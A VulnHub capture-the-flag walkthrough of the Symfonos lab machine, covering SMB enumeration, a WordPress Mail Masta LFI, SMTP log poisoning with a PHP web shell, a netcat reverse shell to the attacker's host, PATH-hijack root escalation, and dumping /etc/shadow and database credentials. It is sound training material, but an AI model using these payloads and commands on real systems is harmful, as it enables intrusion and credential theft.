---
title: "Symfonos"
date: 2021-05-23T02:48:12+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
  - SMB
  - SMTP
  - Log Poisoning
  - WordPress
---

## Symfonos VulnHub Walkthrough

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24`
- Symfonos IP => 10.0.2.9 
- Add `10.0.2.9  symfonos.local` to `/etc/hosts` 

#### RustScan + Nmap

- `sudo rustscan -a 10.0.2.9 -- -sS -sC -A`

```
10.0.2.9:22  => OpenSSH 7.4p1
10.0.2.9:25  => Postfix smtpd
10.0.2.9:80  => Apache httpd 2.4.25 ((Debian))
10.0.2.9:139 => Samba smbd 3.X - 4.X
10.0.2.9:445 => Samba smbd 4.5.16-Debian
```

- We have SMB running so lets enumerate SMB with `nmap`.
- `nmap --script smb-enum-* -p 139,445 10.0.2.9` 

```
| smb-enum-domains: 
|   SYMFONOS
|     Groups: n/a
|     Users: helios
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-shares: 
|   account_used: guest
|   \\10.0.2.9\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.5.16-Debian)
|     Users: 4
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.0.2.9\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\usr\share\samba\anonymous
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.0.2.9\helios: 
|     Type: STYPE_DISKTREE
|     Comment: Helios personal share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\helios\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.0.2.9\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-enum-users: 
|   SYMFONOS\helios (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account
```

#### Enum4Linux

- `enum4linux -a 10.0.2.9`

```
Users on 10.0.2.9
	user:[helios] rid:[0x3e8]
	
Share Enumeration on 10.0.2.9 
===================================== 
Sharename  Type  Comment
---------  ----  -------
print$     Disk  Printer Drivers
helios     Disk  Helios personal share
anonymous  Disk  
IPC$       IPC   IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
=====================================
Attempting to map shares on 10.0.2.9
//10.0.2.9/print$	Mapping: DENIED, Listing: N/A
//10.0.2.9/helios	Mapping: DENIED, Listing: N/A
//10.0.2.9/anonymous	Mapping: OK, Listing: OK
//10.0.2.9/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

---

139/SMB
Found domain(s):
	[+] SYMFONOS
	[+] Builtin
```

- `smbclient --no-pass -L //10.0.2.9/` 
```
Sharename   Type  Comment
---------   ----  -------
print$      Disk  Printer Drivers
helios      Disk  Helios personal share
anonymous   Disk  
IPC$        IPC   IPC Service (Samba 4.5.16-Debian)
```
- There is directory listing enabled on `/anonymous`.

---

### Exploitation

- `smbclient --no-pass //10.0.2.9/anonymous` 
```
smb: \> ls
	attention.txt
smb: \> get attention.txt
```
- `cat attention.txt` 
```
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 
Next person I find using one of these passwords will be fired!
-Zeus
```
- So lets try the `helios` share with one of these passwords. 
- `smbclient -U helios%qwerty //10.0.2.9/helios` 
- And it worked! `ls` showed it had `todo.txt` and `research.txt` files. 
- `cat todo.txt`
```
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```
- `cat research.txt` 
```text
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```
- We probably havea a directory here: `/h3l105`
- `http://symfonos.local/h3l105/` 
- It is a WordPress website. 

#### WordPress Exploitation

- `nikto -h http://10.0.2.9/h3l105`
```
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://symfonos.local/h3l105/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /h3l105/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /h3l105/wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /h3l105/license.txt: License file found may identify site software.
+ /h3l105/: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /h3l105/wp-content/uploads/: Directory indexing found.
+ /h3l105/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /h3l105/wp-login.php: Wordpress login found
---------------------------------------------------------------------------
```

- `wpscan --url http://symfonos.local/h3l105/ -e`

```
Interesting Finding(s):
XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php
Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php
WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
WordPress theme in use: twentynineteen
Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
Version: 1.4 (80% confidence)
The version is out of date, the latest version is 2.0
User(s) Identified:
[+] admin
```

- `wpscan --url http://symfonos.local/h3l105/ --enumerate p` 

```
Plugin(s) Identified:
[+] mail-masta
Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
Latest Version: 1.0 (up to date)
Last Updated: 2014-09-19T07:52:00.000Z
Found By: Urls In Homepage (Passive Detection)
```

- Google: `wordpress mail-masta exploit` => [WordPress Plugin Mail Masta 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/40290). 
- It is a Local File Inclusion or LFI exploit. 
```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
- So we have confirmed the LFI. To escalate LFI to RCE we can use SMTP log poisoning approach. 

#### LFI to RCE

- We connect to SMTP service via telnet and then use the following commands to inject malicious php code.
- `telnet 10.0.2.9 25` 

```
Trying 10.0.2.9...
Connected to 10.0.2.9.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: <kali> (user input)
250 2.1.0 Ok
RCPT TO: Helios (user input)
250 2.1.5 Ok
data (user input)
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?> (user input)
. (user input)
250 2.0.0 Ok: queued as 9B2F940846
```
- Lines with `(user input)` were inserted/typed by us/attacker. 

![Symfonos SMTP log poisoning LFI to RCE](/imgs/symfonos/symfonos_SMTP_log_poisoning_LFI_to_RCE.png)

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id
```

- If we open the source code and scroll to the bottom, we can see the output of command `id`: 
```
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

- After getting a reverse shell, if we read the email we sent with `cat /var/mail/helios`, it will look like this on `symfonos`: 

![Symfonos SMTP Mail](/imgs/symfonos/symfonos_smtp_mail.png)


- Now to get a reverse shell, lets first start a netcat listener on Kali VM. 
- `nc -lvnp 4242` 
- Then went to [Reverse Shell Generator](https://www.revshells.com/) and tried a few to see which one works. (`10.0.2.15/4242`)
- `nc -c sh 10.0.2.15 4242` worked! The URL looked as given below.

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc%20-c%20sh%2010.0.2.15%204242
```

- `python3 -c 'import pty; pty.spawn("/bin/bash")'` 

---

### Privilege Escalation

- `find / -perm -u=s -type f 2>/dev/null` 

![Symfonos Privilege Escalation](/imgs/symfonos/symfonos_privilege_escalation.png)

- `/opt/statuscheck` stands out. 
- `cd /opt` 
- `file statuscheck` => setuid ELF 64-bit LSB shared object
- `strings statuscheck` 

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
```

- Since it is calling `curl`, we can make our own custom `curl` and add it to the PATH so that our custom curl gets accessed first. 
- `cd /tmp` 
- `echo "/bin/sh" > curl` 
- `chmod 777 curl`
- `echo $PATH` 

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
- `export PATH=/tmp:$PATH` 
- `echo $PATH`

```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

- What we are doing here is, we are adding `/tmp` to the beginning of the PATH variable and then keeping the rest of the PATH as it is by appending it with `:$PATH`. What this will do is, when we run `/opt/statuscheck`, it will find `curl` in `/tmp/curl` (our custom `curl`) and will execute it without going for `/usr/bin/curl` since `/tmp` comes first in PATH and since we have `curl` at `/tmp/curl`. 
- Now we just need to run `/opt/statuscheck` and we will get a root shell. 

![Symfonos Root Proof](/imgs/symfonos/symfonos_root_proof.png)

![Symfonos Root Proof 2](/imgs/symfonos/symfonos_root_proof_2.png)

---

### Post Exploitation

#### Password Hashes

- `cat /etc/shadow` 

```
root:$6$NSwfewfo$.XWyJnSz1jy8sgLAHPEKX3TSSCB9pQbfXru.uhfm/XuNo5nvPdTf9ajMfL.MMVjSk9tm/iLrcX1Z2QjTuHV0S0:18076:0:99999:7:::
helios:$6$TqhmMeL9$gBPdf54cCm0VL/0YIgJLEwdNv7YhCZGHcpRgmgCVV1mV4bVUdhu5mC/J/.g1a1ROIpZfVmygOlTgg.3Aby48c0:18076:0:99999:7:::
```
- I tried brute forcing these `sha512crypt` hashes for users `root` and `helios` with `rockyou.txt` but couldn't crack either even after running it for a long time so I decided to stop. 

#### WordPress Configuration Files

- `cat /var/www/html/h3l105/wp-config.php` 

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

- `mysql -u wordpress -p` => `password123`
- `show databases;`
- `use wordpress;` 
- `show tables;` 
- `select * from wp_users;`

```sql
select * from wp_users;
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$B8GkoAZZA6.9fooDdaL05B0sazTW0P/ | admin         | helios@blah.com |          | 2019-06-29 00:46:01 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+
```

- We got a `phpass` hash for `admin`. 
```
$P$B8GkoAZZA6.9fooDdaL05B0sazTW0P/
```
- I tried combining words from all the text files we have found so far and `rockyou.txt` but couldn't crack it. 

